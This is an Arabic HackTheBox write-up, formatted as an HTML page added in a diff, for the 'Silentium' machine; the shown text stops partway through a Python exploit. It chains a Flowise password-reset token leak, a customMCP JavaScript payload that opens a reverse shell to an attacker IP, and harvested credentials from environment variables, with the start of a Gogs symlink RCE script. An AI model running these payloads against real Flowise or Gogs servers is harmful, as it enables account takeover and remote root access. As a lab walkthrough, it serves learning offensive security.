@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Silentium — HTB Writeup كامل</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { background:#0d1117; color:#c9d1d9; font-family:'Segoe UI',Tahoma,sans-serif; line-height:1.8; font-size:16px; }
+
+header { background:linear-gradient(135deg,#161b22,#1f2937); border-bottom:2px solid #30363d; padding:50px 40px; text-align:center; }
+header h1 { font-size:2.6rem; color:#58a6ff; margin-bottom:10px; }
+header .sub { color:#8b949e; font-size:1rem; margin-bottom:20px; }
+
+.badge { display:inline-block; padding:4px 14px; border-radius:20px; font-size:0.8rem; font-weight:bold; margin:4px; }
+.b-red    { background:#3d1b1b; color:#f85149; border:1px solid #f85149; }
+.b-green  { background:#1b3d2b; color:#3fb950; border:1px solid #3fb950; }
+.b-blue   { background:#1b2d3d; color:#58a6ff; border:1px solid #58a6ff; }
+.b-yellow { background:#3d3000; color:#d29922; border:1px solid #d29922; }
+.b-purple { background:#2d1b3d; color:#d2a8ff; border:1px solid #d2a8ff; }
+
+/* TOC */
+.toc { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:24px 30px; max-width:960px; margin:30px auto; }
+.toc h2 { color:#58a6ff; margin-bottom:16px; font-size:1.2rem; }
+.toc ol { padding-right:20px; }
+.toc li { margin:6px 0; }
+.toc a { color:#58a6ff; text-decoration:none; }
+.toc a:hover { text-decoration:underline; }
+
+.container { max-width:960px; margin:0 auto 40px; padding:0 20px; }
+
+.section { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:30px; margin-bottom:28px; scroll-margin-top:20px; }
+.section h2 { font-size:1.5rem; color:#58a6ff; border-bottom:1px solid #30363d; padding-bottom:12px; margin-bottom:20px; }
+.section h3 { font-size:1.1rem; color:#d29922; margin:22px 0 10px; }
+.section h4 { font-size:1rem; color:#3fb950; margin:14px 0 8px; }
+
+p { margin-bottom:12px; color:#c9d1d9; }
+
+pre { background:#010409; border:1px solid #21262d; border-radius:8px; padding:18px 20px; overflow-x:auto; margin:12px 0; direction:ltr; text-align:left; }
+code { font-family:'Consolas','Courier New',monospace; font-size:0.87rem; color:#e6edf3; }
+pre code { color:#e6edf3; }
+
+.ic { background:#21262d; padding:1px 7px; border-radius:4px; font-family:'Consolas',monospace; font-size:0.85rem; color:#a5d6ff; direction:ltr; display:inline-block; }
+
+.alert { border-radius:8px; padding:14px 18px; margin:14px 0; border-right:4px solid; }
+.a-red    { background:#1c0a0a; border-color:#f85149; color:#ffa198; }
+.a-yellow { background:#1c1600; border-color:#d29922; color:#e3b341; }
+.a-blue   { background:#0a1628; border-color:#58a6ff; color:#79c0ff; }
+.a-green  { background:#0a1f0f; border-color:#3fb950; color:#56d364; }
+
+table { width:100%; border-collapse:collapse; margin:14px 0; direction:rtl; }
+th { background:#21262d; color:#e6edf3; padding:10px 14px; text-align:right; font-size:0.9rem; }
+td { padding:9px 14px; border-bottom:1px solid #21262d; color:#c9d1d9; font-size:0.9rem; }
+tr:hover td { background:#1c2128; }
+
+.step { display:flex; gap:14px; align-items:flex-start; margin:14px 0; padding:14px; background:#010409; border-radius:8px; border-right:3px solid #58a6ff; }
+.step-num { background:#58a6ff; color:#0d1117; font-weight:bold; min-width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.95rem; flex-shrink:0; }
+.step-content h4 { color:#e6edf3; margin:0 0 4px; font-size:0.95rem; }
+.step-content p { margin:0; color:#8b949e; font-size:0.9rem; }
+
+.chain { background:#010409; border:1px solid #21262d; border-radius:8px; padding:20px; margin:14px 0; direction:ltr; text-align:left; font-family:'Consolas',monospace; font-size:0.85rem; color:#79c0ff; white-space:pre; overflow-x:auto; }
+
+.cred-box { background:#010409; border:1px solid #3fb950; border-radius:8px; padding:16px 20px; margin:12px 0; direction:ltr; }
+.cred-box .label { color:#8b949e; font-size:0.8rem; font-family:monospace; }
+.cred-box .val   { color:#3fb950; font-family:monospace; font-size:0.92rem; }
+
+.num-badge { background:#58a6ff; color:#0d1117; font-weight:bold; padding:2px 10px; border-radius:12px; font-size:0.8rem; margin-left:8px; }
+
+footer { text-align:center; padding:30px; color:#8b949e; border-top:1px solid #21262d; margin-top:20px; font-size:0.9rem; }
+.flag-blur {
+  filter: blur(6px);
+  cursor: pointer;
+  transition: filter 0.3s ease;
+  user-select: none;
+  display: inline-block;
+}
+.flag-blur.revealed {
+  filter: none;
+  user-select: text;
+}
+.flag-blur::after {
+  content: ' 👁';
+  font-size: 0.7em;
+  opacity: 0.5;
+}
+.flag-blur.revealed::after {
+  content: '';
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <p style="font-size: 1rem; font-weight: bold; color: #79c0ff; margin-bottom: 6px;">Writeup by: joudi janble</p>
+  <h1>🔐 Silentium — HackTheBox</h1>
+  <p class="sub">Writeup كامل خطوة بخطوة بالعربي</p>
+  <span class="badge b-green">Easy</span>
+  <span class="badge b-blue">Linux</span>
+  <span class="badge b-red">CVE-2025-59528</span>
+  <span class="badge b-red">CVE-2025-8110</span>
+  <span class="badge b-yellow">Flowise AI</span>
+  <span class="badge b-purple">Gogs RCE</span>
+</header>
+
+<!-- معلومات الجهاز -->
+<div class="container">
+<div class="section" style="margin-top:30px;">
+  <h2>📋 معلومات الجهاز</h2>
+  <table>
+    <tr><th>المعلومة</th><th>القيمة</th></tr>
+    <tr><td>اسم الجهاز</td><td>Silentium</td></tr>
+    <tr><td>نظام التشغيل</td><td>Linux (Ubuntu 24.04)</td></tr>
+    <tr><td>الصعوبة</td><td>Easy</td></tr>
+    <tr><td>Hostname</td><td><span class="ic">silentium.htb</span></td></tr>
+    <tr><td>CVEs المستخدمة</td><td>CVE-2025-59528, CVE-2025-8110</td></tr>
+    <tr><td>IP الجهاز</td><td><span class="ic">10.129.30.31</span></td></tr>
+  </table>
+</div>
+
+<!-- أنواع الثغرات -->
+<div class="section" style="margin-top:0;">
+  <h2>🧬 أنواع الثغرات المستخدمة</h2>
+
+  <h3>CVE-2025-59528 — Flowise AI 3.0.5</h3>
+  <table>
+    <tr><th>الخاصية</th><th>التفصيل</th></tr>
+    <tr><td>نوع الثغرة</td><td><strong>Information Disclosure + Authentication Bypass</strong></td></tr>
+    <tr><td>التصنيف</td><td><span class="ic">CWE-200</span> — Exposure of Sensitive Information</td></tr>
+    <tr><td>الخدمة</td><td>Flowise AI — منصة بناء AI pipelines</td></tr>
+    <tr><td>الإصدار المتأثر</td><td>3.0.5 وما قبله</td></tr>
+    <tr><td>آلية الاستغلال</td><td>إرسال header خاص <span class="ic">x-request-from: internal</span> إلى endpoint إعادة تعيين كلمة السر — يُعيد الـ <span class="ic">tempToken</span> مباشرة في الرد بدل إرساله للبريد</td></tr>
+    <tr><td>النتيجة</td><td>اختطاف أي حساب بدون وصول للبريد الإلكتروني → دخول كامل للوحة التحكم</td></tr>
+  </table>
+  <div class="alert a-red">
+    🔴 <strong>الخطورة:</strong> المهاجم يستطيع السيطرة على أي حساب (بما فيها الحسابات الإدارية) بمجرد معرفة بريده الإلكتروني فقط — بدون أي كلمة سر أو صلاحية مسبقة.
+  </div>
+
+  <h3>CVE-2025-8110 — Gogs Git Service</h3>
+  <table>
+    <tr><th>الخاصية</th><th>التفصيل</th></tr>
+    <tr><td>نوع الثغرة</td><td><strong>Symlink Following → Arbitrary File Write → RCE</strong></td></tr>
+    <tr><td>التصنيف</td><td><span class="ic">CWE-61</span> → <span class="ic">CWE-94</span> — Symlink Following يؤدي إلى Code Injection</td></tr>
+    <tr><td>الخدمة</td><td>Gogs — خدمة Git self-hosted</td></tr>
+    <tr><td>آلية الاستغلال</td><td>Gogs لا يتحقق من الـ Symlinks عند رفع الملفات — ترفع symlink يشير إلى <span class="ic">.git/config</span> ثم تكتب محتوى خبيث عبر الـ API فيُكتب في الملف الحقيقي</td></tr>
+    <tr><td>المُشغِّل</td><td>خاصية <span class="ic">core.sshCommand</span> في <span class="ic">.git/config</span> تُنفَّذ تلقائياً عند أي عملية git عبر SSH</td></tr>
+    <tr><td>النتيجة</td><td>تنفيذ أوامر عشوائية بصلاحيات الخدمة (root في هذه الحالة)</td></tr>
+  </table>
+  <div class="alert a-red">
+    🔴 <strong>الخطورة:</strong> لأن Gogs يعمل كـ <span class="ic">root</span>، فإن الـ RCE يعطي مباشرةً سيطرة كاملة على الجهاز بأكمله.
+  </div>
+
+  <h3>مقارنة سريعة بين الثغرتين</h3>
+  <table>
+    <tr><th>المعيار</th><th>CVE-2025-59528</th><th>CVE-2025-8110</th></tr>
+    <tr><td>الخدمة</td><td>Flowise AI 3.0.5</td><td>Gogs Git</td></tr>
+    <tr><td>النوع الأساسي</td><td>Information Disclosure</td><td>Symlink → File Write → RCE</td></tr>
+    <tr><td>ما يحتاجه المهاجم</td><td>بريد إلكتروني الضحية فقط</td><td>حساب مسجّل على Gogs</td></tr>
+    <tr><td>النتيجة</td><td>اختطاف حساب → RCE داخل Docker</td><td>Root shell على الجهاز الحقيقي</td></tr>
+    <tr><td>CVSS (تقديري)</td><td>9.8 Critical</td><td>8.8 High</td></tr>
+    <tr><td>دورها في الهجوم</td><td>Initial Access + Docker RCE</td><td>Privilege Escalation → Root</td></tr>
+  </table>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <h2>📑 فهرس المحتوى</h2>
+  <ol>
+    <li><a href="#s1">فحص البورتات (Nmap)</a></li>
+    <li><a href="#s2">اكتشاف الـ Subdomains</a></li>
+    <li><a href="#s3">فحص منصة Flowise</a></li>
+    <li><a href="#s4">اختراق الحساب عبر Password Reset (CVE-2025-59528)</a></li>
+    <li><a href="#s5">RCE داخل Docker عبر CustomMCP</a></li>
+    <li><a href="#s6">سرقة Credentials من Environment Variables</a></li>
+    <li><a href="#s7">SSH كـ ben — User Flag</a></li>
+    <li><a href="#s8">فحص Gogs الداخلي</a></li>
+    <li><a href="#s9">تسجيل حساب على Gogs والحصول على API Token</a></li>
+    <li><a href="#s10">CVE-2025-8110 — Gogs Symlink RCE</a></li>
+    <li><a href="#s11">Root Flag</a></li>
+    <li><a href="#s12">ملخص سلسلة الهجوم</a></li>
+    <li><a href="#s13">جميع الـ Credentials</a></li>
+  </ol>
+</div>
+
+<!-- ===== 1. NMAP ===== -->
+<div class="section" id="s1">
+  <h2>01 — فحص البورتات (Nmap) <span class="num-badge">Step 1</span></h2>
+
+  <p>نبدأ بفحص شامل لجميع البورتات لمعرفة سطح الهجوم:</p>
+
+  <h3>فحص سريع لكل البورتات</h3>
+  <pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.30.31</code></pre>
+
+  <h3>فحص تفصيلي للخدمات</h3>
+  <pre><code>nmap -sCV -p22,80 -Pn 10.129.30.31</code></pre>
+
+  <h3>النتيجة</h3>
+  <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/</code></pre>
+
+  <div class="alert a-blue">
+    💡 فقط بورتان مفتوحان: SSH على 22، وweb على 80. الـ HTTP يعيد التوجيه إلى <span class="ic">silentium.htb</span>
+  </div>
+
+  <h3>إضافة الـ Hostname إلى /etc/hosts</h3>
+  <pre><code>echo "10.129.30.31   silentium.htb" | sudo tee -a /etc/hosts</code></pre>
+</div>
+
+<!-- ===== 2. SUBDOMAINS ===== -->
+<div class="section" id="s2">
+  <h2>02 — اكتشاف الـ Subdomains <span class="num-badge">Step 2</span></h2>
+
+  <p>
+    زيارة <span class="ic">http://silentium.htb/</span> تظهر صفحة مؤسسة مالية عادية — لا شيء مثير.
+    نجرب البحث عن Subdomains مخفية بـ vhost enumeration:
+  </p>
+
+  <h3>بـ ffuf</h3>
+  <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -H "Host: FUZZ.silentium.htb" \
+     -u http://silentium.htb \
+     -fs 178</code></pre>
+
+  <h3>أو بـ gobuster</h3>
+  <pre><code>gobuster vhost -u "http://silentium.htb" \
+  -w bitquark-subdomains-top100000.txt \
+  --append-domain</code></pre>
+
+  <h3>النتيجة</h3>
+  <pre><code>Found: staging.silentium.htb   Status: 200   [Size: 3142]</code></pre>
+
+  <div class="alert a-green">
+    ✅ اكتشفنا <span class="ic">staging.silentium.htb</span> — أضفه لـ /etc/hosts
+  </div>
+
+  <pre><code>sudo sed -i 's/silentium.htb/silentium.htb staging.silentium.htb/' /etc/hosts</code></pre>
+</div>
+
+<!-- ===== 3. FLOWISE ===== -->
+<div class="section" id="s3">
+  <h2>03 — فحص منصة Flowise <span class="num-badge">Step 3</span></h2>
+
+  <p>
+    فتح <span class="ic">http://staging.silentium.htb</span> يكشف عن منصة <strong>Flowise AI</strong>
+    — أداة مفتوحة المصدر لبناء pipelines للذكاء الاصطناعي.
+  </p>
+
+  <h3>التحقق من الإصدار</h3>
+  <pre><code>curl -s http://staging.silentium.htb/api/v1/version
+# النتيجة:
+{"version":"3.0.5"}</code></pre>
+
+  <h3>فحص الـ Endpoints</h3>
+  <pre><code>curl -s http://staging.silentium.htb/api/v1/ping
+# النتيجة: pong</code></pre>
+
+  <div class="alert a-yellow">
+    ⚠️ معظم الـ endpoints تعيد <span class="ic">{"error":"Unauthorized Access"}</span>
+    لكن بعضها يعمل بدون مصادقة — خاصةً <span class="ic">/api/v1/account/forgot-password</span>
+  </div>
+
+  <h3>الـ Endpoints غير المحمية</h3>
+  <table>
+    <tr><th>الـ Endpoint</th><th>الحالة</th><th>ملاحظة</th></tr>
+    <tr><td><span class="ic">/api/v1/version</span></td><td>200</td><td>يعيد الإصدار 3.0.5</td></tr>
+    <tr><td><span class="ic">/api/v1/ping</span></td><td>200</td><td>يعيد "pong"</td></tr>
+    <tr><td><span class="ic">/api/v1/account/forgot-password</span></td><td>يعمل</td><td>⚠️ يكشف الـ Token!</td></tr>
+    <tr><td><span class="ic">/api/v1/account/verify</span></td><td>يعمل</td><td>التحقق من الـ Token</td></tr>
+  </table>
+
+  <h3>معرفة البريد الإلكتروني للمستخدم</h3>
+  <p>
+    في الصفحة الرئيسية <span class="ic">silentium.htb</span>، قسم القيادة يذكر موظف اسمه <strong>Ben</strong>
+    كـ "Head of Financial Systems". بريده الإلكتروني المتوقع:
+    <span class="ic">ben@silentium.htb</span>
+  </p>
+</div>
+
+<!-- ===== 4. PASSWORD RESET ===== -->
+<div class="section" id="s4">
+  <h2>04 — اختراق الحساب عبر Password Reset <span class="num-badge">Step 4</span></h2>
+
+  <p>
+    ثغرة <strong>CVE-2025-59528</strong> — الـ endpoint <span class="ic">/api/v1/account/forgot-password</span>
+    عند إرساله مع header خاص <span class="ic">x-request-from: internal</span>، يعيد
+    <strong>كامل بيانات المستخدم</strong> بما فيها <span class="ic">tempToken</span> لإعادة تعيين كلمة السر!
+  </p>
+
+  <h3>الخطوة 1 — طلب token إعادة التعيين</h3>
+  <pre><code>curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -H "x-request-from: internal" \
+  -d '{"user": {"email": "ben@silentium.htb"}}'</code></pre>
+
+  <h3>الرد من السيرفر</h3>
+  <pre><code>{
+  "user": {
+    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
+    "name": "admin",
+    "email": "ben@silentium.htb",
+    "tempToken": "V1ktVdYlu9bOLiS2tHxSxPGLxKBa3x12U8GAEIxXnZqoAozZdzT2O4Qh2r4Epo9D",
+    "tokenExpiry": "2026-04-12T09:49:04.776Z",
+    "status": "active"
+  }
+}</code></pre>
+
+  <div class="alert a-red">
+    🔴 الـ <span class="ic">tempToken</span> ظهر مباشرة في الرد — هذا هو الخلل الجوهري!
+  </div>
+
+  <h3>الخطوة 2 — التحقق من الـ Token</h3>
+  <pre><code>TOKEN="V1ktVdYlu9bOLiS2tHxSxPGLxKBa3x12U8GAEIxXnZqoAozZdzT2O4Qh2r4Epo9D"
+
+curl -s -X POST http://staging.silentium.htb/api/v1/account/verify \
+  -H "Content-Type: application/json" \
+  -H "x-request-from: internal" \
+  -d "{\"user\": {\"tempToken\": \"$TOKEN\"}}"</code></pre>
+
+  <h3>الخطوة 3 — إعادة تعيين كلمة السر</h3>
+  <pre><code>curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -H "x-request-from: internal" \
+  -d "{\"token\": \"$TOKEN\", \"password\": \"MyPassword123!\"}"
+
+# الرد:
+{"message":"Password reset successfully"}</code></pre>
+
+  <h3>الخطوة 4 — تسجيل الدخول والحصول على JWT</h3>
+  <pre><code>curl -s -X POST http://staging.silentium.htb/api/v1/account/login \
+  -H "Content-Type: application/json" \
+  -H "x-request-from: internal" \
+  -d '{"username": "ben@silentium.htb", "password": "MyPassword123!"}' | jq -r '.token'
+
+# النتيجة: JWT token طويل
+yaJ8yaTnN_2bwzPJQmhU9-0BIFPgMc3bz1a4L-RcmnM...</code></pre>
+
+  <div class="alert a-green">
+    ✅ حصلنا على JWT token للحساب الإداري ben@silentium.htb
+  </div>
+</div>
+
+<!-- ===== 5. RCE ===== -->
+<div class="section" id="s5">
+  <h2>05 — RCE داخل Docker عبر CustomMCP <span class="num-badge">Step 5</span></h2>
+
+  <p>
+    الـ endpoint <span class="ic">/api/v1/node-load-method/customMCP</span> يقبل كود JavaScript
+    في حقل <span class="ic">mcpServerConfig</span> ويُنفّذه مباشرة عبر دالة
+    <span class="ic">Function()</span> — وهو ما يعادل <span class="ic">eval()</span>!
+  </p>
+
+  <div class="alert a-red">
+    🔴 Flowise يعمل على Node.js مع صلاحيات كاملة — يمكن استخدام <span class="ic">child_process</span> لتنفيذ أي أمر
+  </div>
+
+  <h3>الخطوة 1 — فتح Listener</h3>
+  <pre><code># على جهازك:
+nc -lvnp 4444
+
+# أو على Windows بـ Python:
+python3 -c "
+import socket; s=socket.socket()
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+s.bind(('0.0.0.0',4444)); s.listen(1)
+print('[+] Waiting...')
+conn,addr=s.accept()
+print(f'[+] Connection from {addr}')
+[print(conn.recv(4096).decode(),end='') or conn.send((input()+'\n').encode()) for _ in iter(int,1)]
+"</code></pre>
+
+  <h3>الخطوة 2 — إرسال الـ Payload</h3>
+  <pre><code>curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
+  -d '{
+    "loadMethod": "listTools",
+    "nodeData": {
+      "inputs": {
+        "mcpServerConfig": "({x:(function(){ const cp = process.mainModule.require(\"child_process\"); const net = process.mainModule.require(\"net\"); const sh = cp.spawn(\"/bin/sh\",[\"-i\"]); const client = new net.Socket(); client.connect(4444,\"YOUR_IP\",function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return 1; })()})"
+      }
+    }
+  }'</code></pre>
+
+  <h3>النتيجة</h3>
+  <pre><code>connect to [YOUR_IP] from (UNKNOWN) [10.129.30.31] 39426
+/ # id
+uid=0(root) gid=0(root) groups=0(root)
+/ # hostname
+c78c3cceb7ba</code></pre>
+
+  <div class="alert a-yellow">
+    ⚠️ نحن root لكن <strong>داخل Docker container</strong> — ليس الجهاز الأصلي بعد
+  </div>
+</div>
+
+<!-- ===== 6. CREDENTIALS ===== -->
+<div class="section" id="s6">
+  <h2>06 — سرقة Credentials من Environment Variables <span class="num-badge">Step 6</span></h2>
+
+  <p>
+    تقنيات الهروب التقليدية من Docker غير متاحة (لا privileged mode، لا Docker socket).
+    لكن الـ environment variables تحتوي على كنوز!
+  </p>
+
+  <h3>عرض الـ Environment Variables</h3>
+  <pre><code>env</code></pre>
+
+  <h3>المعطيات الحرجة المُكتشفة</h3>
+  <table>
+    <tr><th>المتغير</th><th>القيمة</th></tr>
+    <tr><td><span class="ic">FLOWISE_USERNAME</span></td><td>ben</td></tr>
+    <tr><td><span class="ic">FLOWISE_PASSWORD</span></td><td>F1l3_d0ck3r</td></tr>
+    <tr><td><span class="ic">SMTP_PASSWORD</span></td><td>r04D!!_R4ge</td></tr>
+    <tr><td><span class="ic">SMTP_HOST</span></td><td>mailhog</td></tr>
+    <tr><td><span class="ic">JWT_AUTH_TOKEN_SECRET</span></td><td>AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD</td></tr>
+  </table>
+
+  <h3>فحص قاعدة البيانات</h3>
+  <pre><code>sqlite3 ~/.flowise/database.sqlite "SELECT name, passwd, salt FROM user;"
+# النتيجة:
+ben | $2a$05$2gbC/bWOwKr3lQWFY7TMv.90ZASEJbwmTLM4miWMzMx7D22kpNt6G
+
+cat ~/.flowise/encryption.key
+# النتيجة: hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc</code></pre>
+</div>
+
+<!-- ===== 7. SSH USER FLAG ===== -->
+<div class="section" id="s7">
+  <h2>07 — SSH كـ ben — User Flag <span class="num-badge">Step 7</span></h2>
+
+  <p>
+    كلمة السر <span class="ic">SMTP_PASSWORD</span> وهي <span class="ic">r04D!!_R4ge</span>
+    مُعاد استخدامها كـ SSH password للمستخدم ben على الجهاز الأصلي.
+  </p>
+
+  <pre><code>ssh ben@10.129.30.31
+# كلمة السر: r04D!!_R4ge
+
+ben@silentium:~$ id
+uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)</code></pre>
+
+  <h3>User Flag</h3>
+  <pre><code>ben@silentium:~$ cat user.txt
+<span class="flag-blur">af682b00e02e1e4c████████████████</span></code></pre>
+
+  <div class="alert a-green">
+    ✅ User Flag محفوظ! الآن نتجه نحو الـ root
+  </div>
+</div>
+
+<!-- ===== 8. GOGS ENUM ===== -->
+<div class="section" id="s8">
+  <h2>08 — فحص Gogs الداخلي <span class="num-badge">Step 8</span></h2>
+
+  <h3>اكتشاف البورتات الداخلية</h3>
+  <pre><code>ben@silentium:~$ ss -tlnp</code></pre>
+  <pre><code>127.0.0.1:3001  — Gogs Git service
+127.0.0.1:3000  — Flowise (Docker)
+127.0.0.1:8025  — Mailhog
+127.0.0.1:1025  — Mailhog SMTP</code></pre>
+
+  <h3>قراءة إعدادات Gogs</h3>
+  <pre><code>ben@silentium:~$ cat /opt/gogs/gogs/custom/conf/app.ini</code></pre>
+
+  <h3>الإعدادات الحرجة</h3>
+  <table>
+    <tr><th>الإعداد</th><th>القيمة</th><th>الأهمية</th></tr>
+    <tr><td><span class="ic">RUN_USER</span></td><td><strong>root</strong></td><td>🔴 يعمل بصلاحيات root!</td></tr>
+    <tr><td><span class="ic">HTTP_PORT</span></td><td>3001</td><td>البورت الداخلي</td></tr>
+    <tr><td><span class="ic">DOMAIN</span></td><td>staging-v2-code.dev.silentium.htb</td><td>Host header مطلوب</td></tr>
+    <tr><td><span class="ic">DISABLE_REGISTRATION</span></td><td>false</td><td>التسجيل مفتوح</td></tr>
+    <tr><td><span class="ic">ENABLE_REGISTRATION_CAPTCHA</span></td><td>true</td><td>Captcha مطلوب</td></tr>
+  </table>
+
+  <div class="alert a-red">
+    🔴 <strong>خطر جداً:</strong> Gogs يعمل كـ root — أي RCE = سيطرة كاملة على الجهاز
+  </div>
+
+  <h3>SSH Tunnel للوصول لـ Gogs من جهازك</h3>
+  <pre><code># من جهازك (Windows/Kali):
+ssh -N -f -L 3001:127.0.0.1:3001 ben@10.129.30.31</code></pre>
+
+  <h3>التحقق من الـ API</h3>
+  <pre><code>curl -s -H "Host: staging-v2-code.dev.silentium.htb" \
+  http://127.0.0.1:3001/api/v1/repos/search
+# النتيجة: {"data":[],"ok":true}</code></pre>
+</div>
+
+<!-- ===== 9. GOGS REGISTER ===== -->
+<div class="section" id="s9">
+  <h2>09 — تسجيل حساب على Gogs والحصول على API Token <span class="num-badge">Step 9</span></h2>
+
+  <p>
+    التسجيل يتطلب Captcha — يجب حلها يدوياً.
+    بديلاً عن ذلك يمكن استخدام الـ API مباشرة إذا كانت مفتوحة.
+  </p>
+
+  <h3>الخطوة 1 — الحصول على CSRF Token و Captcha</h3>
+  <pre><code># على الجهاز المستهدف (ben@silentium):
+curl -s http://127.0.0.1:3001/user/sign_up -c /tmp/cookies.txt > /tmp/signup.html
+
+# استخراج CSRF
+CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html | head -1)
+
+# استخراج Captcha ID
+CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html | head -1)
+
+# تحميل صورة الـ Captcha
+curl -s -b /tmp/cookies.txt \
+  "http://127.0.0.1:3001/captcha/${CAPTCHA_ID}.png" -o /tmp/captcha.png</code></pre>
+
+  <div class="alert a-yellow">
+    ⚠️ انقل <span class="ic">captcha.png</span> لجهازك وحل الـ Captcha بصرياً
+  </div>
+
+  <h3>الخطوة 2 — إرسال بيانات التسجيل</h3>
+  <pre><code>CAPTCHA_ANSWER="الرقم_الذي_رأيته"
+
+curl -s -X POST http://127.0.0.1:3001/user/sign_up \
+  -b /tmp/cookies.txt -c /tmp/cookies.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "_csrf=$CSRF" \
+  --data-urlencode "user_name=yyty" \
+  --data-urlencode "email=yyty@test.com" \
+  --data-urlencode "password=Max@123max" \
+  --data-urlencode "retype=Max@123max" \
+  --data-urlencode "captcha_id=$CAPTCHA_ID" \
+  --data-urlencode "captcha=$CAPTCHA_ANSWER"</code></pre>
+
+  <h3>الخطوة 3 — الحصول على API Token</h3>
+  <pre><code>curl -s -X POST \
+  -H "Host: staging-v2-code.dev.silentium.htb" \
+  -H "Content-Type: application/json" \
+  "http://127.0.0.1:3001/api/v1/users/yyty/tokens" \
+  -u "yyty:Max@123max" \
+  -d '{"name":"exploit"}'
+
+# النتيجة:
+{"name":"exploit","sha1":"0ca8513ad024ffe37b6f2ad601ffaa63b269d41f"}</code></pre>
+
+  <div class="alert a-green">
+    ✅ حصلنا على API Token: <span class="ic">0ca8513ad024ffe37b6f2ad601ffaa63b269d41f</span>
+  </div>
+</div>
+
+<!-- ===== 10. CVE-2025-8110 ===== -->
+<div class="section" id="s10">
+  <h2>10 — CVE-2025-8110 — Gogs Symlink RCE <span class="num-badge">Step 10</span></h2>
+
+  <h3>شرح الثغرة</h3>
+  <p>
+    Gogs لا يتحقق من الـ <strong>Symlinks</strong> عند تحديث محتوى ملف عبر الـ API.
+    هذا يسمح بالكتابة فوق ملف <span class="ic">.git/config</span> بمحتوى خبيث.
+    الـ <span class="ic">core.sshCommand</span> في هذا الملف يُنفَّذ تلقائياً عند أي عملية git عبر SSH.
+  </p>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-content"><h4>إنشاء Repo + Symlink يشير إلى .git/config</h4><p>نرفع ملف symlink داخل الـ Repository يشير للملف الحساس</p></div>
+  </div>
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-content"><h4>تحديث محتوى الـ Symlink عبر API</h4><p>Gogs يكتب المحتوى في .git/config الحقيقي بدل الـ Symlink</p></div>
+  </div>
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-content"><h4>Gogs يُشغّل git push عبر SSH</h4><p>فيُنفِّذ sshCommand الخبيث — reverse shell كـ root!</p></div>
+  </div>
+
+  <h3>الخطوة 1 — فتح Listener (على جهازك)</h3>
+  <pre><code># على Linux/Kali:
+nc -lvnp 9001
+
+# على Windows (Python):
+python3 -c "
+import socket; s=socket.socket()
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+s.bind(('0.0.0.0',9001)); s.listen(1)
+print('[+] Waiting for connection on port 9001...')
+conn,addr=s.accept()
+print(f'[+] Connection from {addr}')
+[print(conn.recv(4096).decode(),end='') or conn.send((input()+'\n').encode()) for _ in iter(int,1)]
+"</code></pre>
+
+  <h3>الخطوة 2 — السكريبت الخاص بنا (exploit2.py)</h3>
+  <p>احفظ هذا الملف في <span class="ic">/home/ben/exploit2.py</span> على الجهاز المستهدف:</p>
+  <pre><code>#!/usr/bin/env python3
+# CVE-2025-8110 — Gogs Symlink Git Config Injection RCE
+# HackTheBox: Silentium
+
+import requests
+import subprocess
+import tempfile
+import os
+import base64
+
+# ============ إعدادات مخصصة ============
+GOGS_URL = "http://127.0.0.1:3001"
+HOST     = "staging-v2-code.dev.silentium.htb"  # Host header مطلوب
+REPO     = "pwn-repo2"                           # اسم الـ Repository
+USERNAME = "yyty"                                # الحساب المسجّل على Gogs
+PASSWORD = "Max%40123max"                        # @ مشفّرة كـ %40 في الـ URL
+TOKEN    = "0ca8513ad024ffe37b6f2ad601ffaa63b269d41f"  # API Token
+LHOST    = "10.10.16.195"                        # IP جهاز المهاجم
+LPORT    = "9001"                                # بورت الاستماع
+# =======================================
+
+# إنشاء Session مع Headers المطلوبة
+s = requests.Session()
+s.headers.update({"Host": HOST, "Authorization": f"token {TOKEN}"})
+
+# 1. إنشاء Repository جديد
+r = s.post(f"{GOGS_URL}/api/v1/user/repos",
+           json={"name": REPO, "private": False, "auto_init": False})
+print(f"[+] Repo creation status: {r.status_code}")
+# 201 = جديد / 422 = موجود مسبقاً (كلاهما مقبول)
+
+# 2. إنشاء Repository محلي مع Symlink
+work = tempfile.mkdtemp()
+os.chdir(work)
+subprocess.run(["git", "init"], capture_output=True)
+subprocess.run(["git", "config", "user.email", "h@h.com"], capture_output=True)
+subprocess.run(["git", "config", "user.name", "h"], capture_output=True)
+
+# ⭐ جوهر الثغرة: symlink يشير إلى .git/config
+os.symlink(".git/config", os.path.join(work, "symlink"))
